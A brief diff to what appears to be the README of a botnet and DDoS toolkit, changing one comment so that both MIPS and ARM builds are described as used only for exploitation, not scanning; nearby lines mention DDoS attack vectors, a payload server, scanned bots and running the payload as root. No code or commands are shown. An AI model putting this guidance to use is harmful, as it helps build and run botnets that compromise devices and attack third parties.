@@ -147,7 +147,7 @@ All of the attack vectors except "HTTP" DDoS vectors will be random source ports
 	
 	# The bot system architecture is up to which payload you upload on your payload server.
 	# If you upload x32 on your payload server, the bot that you have scanned will be only x32 arch.
-	# The MIPS architecture is specific for doing an exploit only, so it doesn't count to the scan process!!!
+	# The MIPS and ARM architecture is specific for doing an exploit only, so it doesn't count to the scan process!!!
 	# To run the payload you need to run with root access!!!
 
 # Requirements
